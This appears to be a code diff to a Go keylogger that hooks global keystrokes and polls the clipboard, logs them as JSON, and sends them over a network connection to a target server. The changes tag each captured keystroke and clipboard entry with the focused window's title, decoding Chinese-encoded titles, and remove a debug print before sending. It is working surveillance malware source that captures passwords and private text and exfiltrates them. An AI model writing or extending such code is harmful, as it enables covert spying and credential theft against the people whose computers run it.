@@ -8,14 +8,21 @@
 package main
 
 import (
+	"bytes"
 	"encoding/json"
 	"fmt"
 	"github.com/atotto/clipboard"
+	"github.com/go-vgo/robotgo"
+	_ "github.com/go-vgo/robotgo"
 	hook "github.com/robotn/gohook"
+	"golang.org/x/text/encoding/simplifiedchinese"
+	"golang.org/x/text/transform"
+	"io/ioutil"
 	"net"
 	"os"
 	"os/signal"
 	"time"
+	"unicode/utf8"
 )
 
 // KeyType is the alias of string
@@ -38,13 +45,15 @@ const (
 type keyLog struct {
 	Time  int64   `json:"time"`
 	Type  KeyType `json:"type"`
+	Title string  `json:"title"`
 	Value string  `json:"value"`
 }
 
-func newKeyLog(keyType KeyType, value string) keyLog {
+func newKeyLog(keyType KeyType, title string, value string) keyLog {
 	return keyLog{
 		Time:  time.Now().UnixMilli(),
 		Type:  keyType,
+		Title: title,
 		Value: value,
 	}
 }
@@ -84,7 +93,7 @@ func listenClipboard() {
 		// If the clipboard is nonempty string or has been changed, log it and reset ticker.
 		if t != text && t != "" {
 			text = t
-			keyLogs = append(keyLogs, newKeyLog(TypeClipboard, text))
+			keyLogs = append(keyLogs, newKeyLog(TypeClipboard, getTitle(), text))
 			ticker.Reset(Interval)
 		}
 	}
@@ -99,32 +108,49 @@ func listenKeyboard() {
 		// symbols, space, enter, etc.) will call the hook.KeyDown event, others (ctrl, alt, f1, etc.) will not. Thus,
 		// if detected characters typed, log it and reset ticker.
 		if ev.Kind == hook.KeyDown {
+			// Get title.
+			title := getTitle()
 			// Treat return (\r, enter on keyboard), backspace (\b), and tab (\t) as special keys.
 			switch ev.Keychar {
 			case '\r':
-				keyLogs = append(keyLogs, newKeyLog(TypeSpecial, "enter"))
+				keyLogs = append(keyLogs, newKeyLog(TypeSpecial, title, "enter"))
 			case '\b':
-				keyLogs = append(keyLogs, newKeyLog(TypeSpecial, "backspace"))
+				keyLogs = append(keyLogs, newKeyLog(TypeSpecial, title, "backspace"))
 			case '\t':
-				keyLogs = append(keyLogs, newKeyLog(TypeSpecial, "tab"))
+				keyLogs = append(keyLogs, newKeyLog(TypeSpecial, title, "tab"))
 			case rune(27):
-				keyLogs = append(keyLogs, newKeyLog(TypeSpecial, "escape"))
+				keyLogs = append(keyLogs, newKeyLog(TypeSpecial, title, "escape"))
 			default:
 				// When nothing logged or the last recorded character is not TypeKeyboard, append a new logKey object
 				// directly. If it has recorded and the last recorded type is also TypeKeyboard, append the character to
 				// the Value field of the last object.
 				if len(keyLogs) == 0 {
-					keyLogs = append(keyLogs, newKeyLog(TypeKeyboard, fmt.Sprintf("%c", ev.Keychar)))
+					keyLogs = append(keyLogs, newKeyLog(TypeKeyboard, title, fmt.Sprintf("%c", ev.Keychar)))
 				} else {
 					if keyLogs[len(keyLogs)-1].Type == TypeKeyboard {
-						keyLogs[len(keyLogs)-1].Value += fmt.Sprintf("%c", ev.Keychar)
+						if keyLogs[len(keyLogs)-1].Title == title {
+							keyLogs[len(keyLogs)-1].Value += fmt.Sprintf("%c", ev.Keychar)
+						} else {
+							keyLogs = append(keyLogs, newKeyLog(TypeKeyboard, title, fmt.Sprintf("%c", ev.Keychar)))
+						}
 					} else {
-						keyLogs = append(keyLogs, newKeyLog(TypeKeyboard, fmt.Sprintf("%c", ev.Keychar)))
+						keyLogs = append(keyLogs, newKeyLog(TypeKeyboard, title, fmt.Sprintf("%c", ev.Keychar)))
 					}
 				}
 			}
 			ticker.Reset(Interval)
 		}
+	}
+}
+
+// getTitle gets the currently focused application title and convert to UTF-8 texts according to its original charset.
+func getTitle() string {
+	titleBytes := []byte(robotgo.GetTitle())
+	if utf8.Valid(titleBytes) {
+		return string(titleBytes)
+	} else {
+		title, _ := ioutil.ReadAll(transform.NewReader(bytes.NewBuffer(titleBytes), simplifiedchinese.GB18030.NewDecoder()))
+		return string(title)
 	}
 }
 
@@ -154,10 +180,9 @@ func sendLogs() {
 	}
 	defer conn.Close()
 	// Serialise keyLog slice to JSON.
-	bytes, _ := json.Marshal(keyLogs)
+	logsBytes, _ := json.Marshal(keyLogs)
 	// Send logs to the target server.
-	_, err = conn.Write(bytes)
-	fmt.Println(string(bytes))
+	_, err = conn.Write(logsBytes)
 	if err != nil {
 		fmt.Println(err.Error())
 	}
